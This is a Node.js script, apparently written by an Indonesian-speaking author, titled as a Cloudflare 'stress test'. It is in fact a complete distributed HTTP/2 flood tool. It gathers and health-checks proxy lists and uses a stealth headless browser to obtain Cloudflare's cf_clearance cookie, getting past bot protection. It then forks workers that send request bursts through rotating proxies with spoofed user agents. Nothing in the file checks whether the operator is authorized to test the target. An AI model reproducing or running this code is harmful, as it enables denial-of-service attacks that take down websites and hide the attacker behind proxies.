// stress-cf-advanced.js 
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");
const https = require("https");
const { HeaderGenerator } = require('header-generator');
const UserAgent = require('user-agents');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// ==================== KONFIGURASI ARGUMEN ====================
if (process.argv.length < 7) {
  console.log(`Usage: node stress-cf-advanced.js <target> <duration_sec> <rate> <threads> <proxy_source>
  proxy_source: file path (proxies.txt) atau URL API (http://...)
  `);
  process.exit();
}

const args = {
  target: process.argv[2],
  duration: parseInt(process.argv[3]),
  rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxySource: process.argv[6] // bisa file atau URL
};

// ==================== FUNGSI BACA PROXY DARI FILE / URL ====================
async function fetchProxies(source) {
  let content = '';
  if (source.startsWith('http://') || source.startsWith('https://')) {
    console.log(`[Proxy] Mengambil daftar proxy dari URL: ${source}`);
    try {
      const resp = await axios.get(source, { timeout: 10000 });
      content = resp.data;
    } catch (e) {
      console.error('[Proxy] Gagal mengambil dari URL:', e.message);
      process.exit(1);
    }
  } else {
    console.log(`[Proxy] Membaca daftar proxy dari file: ${source}`);
    content = fs.readFileSync(source, 'utf-8');
  }
  // Parsing: satu baris = satu proxy (ip:port)
  const proxies = content.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
  console.log(`[Proxy] Total ${proxies.length} proxy ditemukan.`);
  return proxies;
}

// ==================== MANAJEMEN PROXY DENGAN HEALTH CHECK ====================
class ProxyManager {
  constructor(proxies) {
    this.proxies = new Map();
    proxies.forEach(p => this.proxies.set(p, { fails: 0, success: 0, lastUsed: 0, alive: true }));
    this.checked = new Set();
  }
  getProxy() {
    // Pilih proxy dengan skor terbaik (fails rendah, lastUsed lama)
    let best = null, bestScore = -Infinity;
    for (const [proxy, stats] of this.proxies) {
      if (!stats.alive) continue;
      const score = stats.success * 10 - stats.fails * 5 - (Date.now() - stats.lastUsed) / 1000;
      if (score > bestScore) { bestScore = score; best = proxy; }
    }
    if (best) {
      const s = this.proxies.get(best);
      s.lastUsed = Date.now();
      this.proxies.set(best, s);
    }
    return best;
  }
  mark(proxy, ok) {
    const s = this.proxies.get(proxy);
    if (!s) return;
    if (ok) { s.success++; s.fails = Math.max(0, s.fails - 1); }
    else { s.fails++; if (s.fails > 5) s.alive = false; }
    this.proxies.set(proxy, s);
  }
  getAliveCount() {
    let count = 0;
    for (const [, stats] of this.proxies) if (stats.alive) count++;
    return count;
  }
}

// Health check (test proxy dengan connect ke target melalui CONNECT)
async function checkProxy(proxy, targetHost) {
  const [host, port] = proxy.split(':');
  return new Promise((resolve) => {
    const socket = net.connect(port, host, () => {
      // Kirim CONNECT ke target
      socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    socket.setTimeout(5000, () => { socket.destroy(); resolve(false); });
    socket.on('data', (data) => {
      const resp = data.toString();
      if (resp.includes('200 Connection established') || resp.includes('200 OK')) {
        socket.destroy();
        resolve(true);
      } else {
        socket.destroy();
        resolve(false);
      }
    });
    socket.on('error', () => resolve(false));
    socket.on('close', () => resolve(false));
  });
}

// ==================== FUNGSI MENDAPATKAN COOKIE CLOUDFLARE ====================
async function getCloudflareCookie(targetUrl, proxy = null) {
  console.log(`[CF-Bypass] Mencoba cookie melalui ${proxy || 'tanpa proxy'}`);
  const browser = await puppeteer.launch({
    headless: true,
    args: proxy ? [`--proxy-server=http://${proxy}`] : [],
    ignoreHTTPSErrors: true,
  });
  try {
    const page = await browser.newPage();
    await page.setUserAgent(new UserAgent().toString());
    await page.setViewport({ width: 1280, height: 720 });
    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
    const cookies = await page.cookies();
    await browser.close();
    const cf = cookies.find(c => c.name === 'cf_clearance');
    if (cf) {
      console.log(`[CF-Bypass] Berhasil: ${cf.value}`);
      return cf;
    }
    console.log('[CF-Bypass] Gagal (tidak ada cf_clearance)');
    return null;
  } catch (err) {
    console.error('[CF-Bypass] Error:', err.message);
    await browser.close();
    return null;
  }
}

// ==================== FUNGSI FLOOD (HTTP/2) ====================
function runFlooder(cookie, proxyManager, parsedTarget) {
  const proxy = proxyManager.getProxy();
  if (!proxy) {
    // Tidak ada proxy hidup, hentikan sementara
    return;
  }
  const [proxyHost, proxyPort] = proxy.split(':');

  // Buat socket ke proxy
  const socket = net.connect({ host: proxyHost, port: parseInt(proxyPort) }, () => {
    socket.write(`CONNECT ${parsedTarget.hostname}:443 HTTP/1.1\r\nHost: ${parsedTarget.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  });
  socket.setTimeout(10000, () => { socket.destroy(); proxyManager.mark(proxy, false); });

  socket.on('data', (chunk) => {
    const resp = chunk.toString();
    if (!resp.includes('200 Connection established') && !resp.includes('200 OK')) {
      socket.destroy();
      proxyManager.mark(proxy, false);
      return;
    }
    // Tunnel siap
    const tlsOpts = {
      ALPNProtocols: ['h2'],
      servername: parsedTarget.hostname,
      socket: socket,
      rejectUnauthorized: false,
      ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384',
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
    };
    const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOpts);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.origin, {
      createConnection: () => tlsConn,
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
    });

    client.on('connect', () => {
      const headers = {
        ':method': 'GET',
        ':path': parsedTarget.pathname + (parsedTarget.search || ''),
        ':scheme': 'https',
        ':authority': parsedTarget.hostname,
        'user-agent': new UserAgent().toString(),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'cookie': `cf_clearance=${cookie.value};`,
        'referer': parsedTarget.origin,
      };
      // Kirim request sesuai rate
      for (let i = 0; i < args.rate; i++) {
        const req = client.request(headers);
        req.on('response', () => { req.close(); req.destroy(); });
        req.on('error', () => {});
        req.end();
      }
      proxyManager.mark(proxy, true);
    });

    client.on('error', () => {
      client.destroy();
      socket.destroy();
      proxyManager.mark(proxy, false);
    });
    client.on('close', () => {
      client.destroy();
      socket.destroy();
    });
  });

  socket.on('error', () => {
    socket.destroy();
    proxyManager.mark(proxy, false);
  });
}

// ==================== MASTER / WORKER ====================
if (cluster.isMaster) {
  console.clear();
  console.log(`
\x1b[36m=========================================
   STRESS TEST CLOUDFLARE ADVANCED
   Target: ${args.target}
   Durasi: ${args.duration} detik
   Rate: ${args.rate} req/detik per worker
   Threads: ${args.threads}
   Proxy source: ${args.proxySource}
=========================================\x1b[0m
  `);

  (async () => {
    // 1. Ambil daftar proxy dari file/URL
    const rawProxies = await fetchProxies(args.proxySource);
    if (rawProxies.length === 0) {
      console.log('[Fatal] Tidak ada proxy. Keluar.');
      process.exit(1);
    }
    const proxyManager = new ProxyManager(rawProxies);
    const parsedTarget = new URL(args.target);

    // 2. Health check awal untuk beberapa proxy (opsional)
    console.log('[Proxy] Melakukan health check awal...');
    let alive = 0;
    for (const p of rawProxies) {
      const ok = await checkProxy(p, parsedTarget.hostname);
      if (ok) alive++;
      else proxyManager.mark(p, false);
    }
    console.log(`[Proxy] ${alive} proxy hidup dari ${rawProxies.length}`);

    // 3. Dapatkan cookie cf_clearance (coba melalui proxy hidup)
    let cookie = null;
    const aliveProxies = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
    for (const p of aliveProxies.slice(0, 5)) { // coba 5 proxy pertama
      cookie = await getCloudflareCookie(args.target, p);
      if (cookie) break;
    }
    if (!cookie) {
      // Coba tanpa proxy
      cookie = await getCloudflareCookie(args.target, null);
    }
    if (!cookie) {
      console.log('[Fatal] Tidak bisa melewati Cloudflare. Keluar.');
      process.exit(1);
    }
    console.log(`[Master] Cookie berhasil: ${cookie.value}`);

    // 4. Fork worker
    for (let i = 1; i <= args.threads; i++) {
      const worker = cluster.fork();
      worker.send({ cookie: cookie, proxyManagerData: null }); // kita kirim cookie saja, manager dibuat di worker? Lebih mudah kirim array proxy
    }

    // Kirim daftar proxy ke setiap worker (karena proxyManager tidak bisa di-serialize)
    // Alternatif: worker membaca ulang proxy dari source? Lebih efisien kirim array.
    const proxyArray = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
    for (const id in cluster.workers) {
      cluster.workers[id].send({ proxies: proxyArray });
    }

    // 5. Timer durasi
    setTimeout(() => {
      console.log(`\n[Master] Waktu habis. Menghentikan semua worker.`);
      for (const id in cluster.workers) {
        cluster.workers[id].kill();
      }
      process.exit(0);
    }, args.duration * 1000);

    // 6. Monitor status tiap 10 detik
    setInterval(() => {
      console.log(`[Master] Worker aktif: ${Object.keys(cluster.workers).length}, Proxy hidup: ${proxyManager.getAliveCount()}`);
    }, 10000);

  })();

} else {
  // Worker: terima cookie dan daftar proxy
  let cookie = null;
  let proxyArray = [];
  process.on('message', (msg) => {
    if (msg.cookie) cookie = msg.cookie;
    if (msg.proxies) {
      proxyArray = msg.proxies;
      // Inisialisasi ProxyManager di worker
      const manager = new ProxyManager(proxyArray);
      const parsedTarget = new URL(process.argv[2]);
      console.log(`[Worker ${cluster.worker.id}] Siap, ${proxyArray.length} proxy.`);
      // Flood interval
      setInterval(() => {
        runFlooder(cookie, manager, parsedTarget);
      }, 100); // setiap 100ms coba kirim
    }
  });
}
